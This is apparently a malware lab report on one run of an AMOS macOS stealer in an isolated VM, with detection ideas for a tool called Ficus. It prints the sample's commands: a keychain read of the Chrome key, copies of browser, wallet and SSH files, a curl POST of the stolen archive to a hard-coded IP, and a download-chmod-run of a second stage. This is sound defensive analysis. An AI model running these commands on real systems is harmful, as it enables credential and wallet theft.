# An AMOS stealer from MalwareBazaar in the Ficus malware lab

Run `bazaar-amos-fdcd5d21-20261119T225524Z-55001`, 2026-11-19. The first sample from MalwareBazaar, and the first run on the lab's main (developer) guest image.
Written from the run folder's evidence. No report covers this exact build, so the comparison below is against reports of related AMOS stealers.

## Summary

- **What ran.** An AMOS (Atomic macOS Stealer) Mach-O, first seen on MalwareBazaar on 2026-11-16, run once in the lab's throwaway macOS 26.6.2 guest with `eslogger` recording and a fake internet.
- **What happened.** In **0.8 seconds** it did a complete theft: it read the Chrome keychain key, fingerprinted the Mac, copied browser, wallet, Notes and shell data into a staging folder, zipped it, **POSTed 66,298 bytes to a hard-coded IP address**, deleted its tracks, then downloaded a second-stage program, made it executable and started it. It never asked for a password and wrote no persistence.
- **What Ficus saw.** 15 findings under the sample and a triage queue of 15 items, six of them high. It caught the keychain read, the staging copies, the archive and the download. It has no rule for the upload.
- **Compared with the reports:** 5 hits, 4 misses, 3 gaps, 1 for review. The hits are rule-level and need reading against what actually ran (see below). The misses are behaviors this build did not show.
- **The lab.** The new MalwareBazaar path worked end to end: fetch by hash with the Auth-Key kept off every command line and file, AES zip opened in the guest with 7-Zip, run, collected.

## How it was run

- **Guest:** `lab-gold`, the main image (macOS 26.6.2, Node.js, PHP, Go, Rust, 7-Zip, Google Chrome), `eslogger` schema 10. Fresh clone, deleted afterwards. The x86_64 half runs through Rosetta.
- **Network:** a private cable to a gateway VM answering every name and address with INetSim. The isolation check passed before the sample was copied in. The sample's addresses were therefore redirected into the lab and never left it.
- **Recording:** `eslogger` through `tart exec`: 7,612,253 bytes, 3,409 events, 245 processes, 0 dropped events, 0 bad lines.
- **Recipe:** `manual`. I extracted it in the guest (`7zz x -pinfected`), inspected it read-only (`file`, `codesign`, `otool -L`, `strings`), then ran `./<sha256>.macho` with no arguments, in the background. Nobody touched the guest while it ran.

## What the sample did (observed)

Every command comes from the sample itself, run through `sh -c`, in this order:

1. `sw_vers -productVersion | cut -d. -f1` and `… -f2`: the macOS version.
2. `security find-generic-password -ga "Chrome" 2>&1 >/dev/null | sed -n "s/^password: \"\(.*\)\"/\1/p"`: the Chrome Safe Storage key. It worked silently in the lab, and a `masterpass-chrome` entry appears in the staging folder (I did not read its contents).
3. `system_profiler SPSoftwareDataType SPHardwareDataType SPDisplaysDataType` (which in turn ran `csrutil status`): software, hardware and display lists, into `hardware/` and `installedSoft/`.
4. Copies into the staging folder `/tmp/lksopo/` (made by the sample's own file calls, not by `cp`): `chromium/Chrome_Default/{Cookies,Login Data,Web Data}`, `gecko/Firefox_lab.default/{logins.json,key4.db,cookies.sqlite}`, `deskwallets/Exodus/…/seed.seco`, `deskwallets/Atomic/000003.log`, `finder/{NoteStore.sqlite,-wal,-shm,Cookies.binarycookies,zsh_history,known_hosts,authorized_keys}`, `kc/` and `user/`. All of these are my fake bait files, except the system lists.
5. `ditto -c -k --sequesterRsrc /tmp/lksopo /tmp/lksopo.zip`.
6. `curl -X POST -H "buildid: efa8bd136c874da1a52929086464b57f" -H "username: pkbl2x41ld" --data-binary @/tmp/lksopo.zip http://85.193.68.244/log`. The gateway capture shows the request: 66,298 bytes, `Content-Type: application/x-www-form-urlencoded`.
7. `rm -rf /tmp/lksopo` and `rm -f /tmp/lksopo.zip`.
8. `curl -o '/tmp/binaryexe' http://85.193.68.245/web/bot`, `chmod +x '/tmp/binaryexe'`, then `"/tmp/binaryexe" > /dev/null 2>&1 & disown`. In the lab the server answered with INetSim's 275-byte 404 page, so the "second stage" was an HTML file.

It also left two hidden files in the home folder: `~/.username` (the 10-character id `pkbl2x41ld` it sends as the `username` header) and `~/.phost`.

**What it did not do:** no `osascript`, no password dialog, no `dscl authonly`, no kill of security tools, no LaunchAgent, no cron entry, nothing in the post-state. No network contact beyond the two IP addresses: the other lookups in the gateway capture are the guest's own boot-time traffic (Apple services, and a few Google names asked at 22:55:46, before the start marker and 78 seconds before the sample ran; no Chrome process started during the recording), plus my isolation probes.

## What the evidence suggests for Ficus

1. **A rule for uploading a file with `curl`**: `-X POST --data-binary @file`, `-F name=@file`, `-d @file` or `-T file`, especially to a bare IP address with custom headers. Here the exfiltration of the whole stolen set is one such command and nothing flags it; every other step of the theft is flagged. It has to be tested against `lab/baselines.md`, whose `curl` only downloads.
2. **Hidden marker files written to the home folder** (`~/.username`, `~/.phost`; the article names `~/.pwd`, `~/.username`, `~/.marker`) by a non-Apple process: a weak signal alone, a cheap addition to a chain that already has findings.
3. **The chain's shape is the strongest evidence:** a non-Apple program that runs `security … Chrome`, copies browser, wallet and Notes files into one `/tmp/<random>` folder, zips it, uploads it and deletes it within a second. Ficus raises each step; the triage queue has 15 items for one program, and grouping them under the sample's process (as the `--under` view does) would turn that into one story.
4. **`download` plus `chmod +x` plus a background start** (`& disown`) of the same file, in one command chain, as a pattern independent of the file's content.
5. **`odd-location-exec` on every pilot sample comes from where the lab puts them** (`~/Downloads/sample`). The row is always high and always "review"; consider moving samples to a neutral folder, or scoring it down in `lab-summarize`.

## Limits

- **One run of under a second of activity,** on a sample whose stages beyond the first depend on the C2; the lab's C2 answers every request with a 404 page, so the second stage (and anything it would have done, such as persistence) was not reached.
- **The Chrome keychain item was readable without a prompt** because my bait item was created with the `security` tool, which can then read it silently. A real Chrome item would make macOS ask the user, so on a real Mac this step may behave differently.
- **This build never showed the behaviors the articles describe for the script-based variant** (the fake dialog, the password check, persistence, killing security tools). It may be a stage or a different variant; one run cannot tell which.
- **No VM check was seen,** but the sample may still check things it does not show.
- The guest's `eslogger` schema is 10; the stdin checks work on it (their input comes from `fds` in the `exec` events).
- The comparison is by rule, not by behavior: a rule firing on a different thing than the article's (Chrome, not Safari) still counts as a hit.

## Next
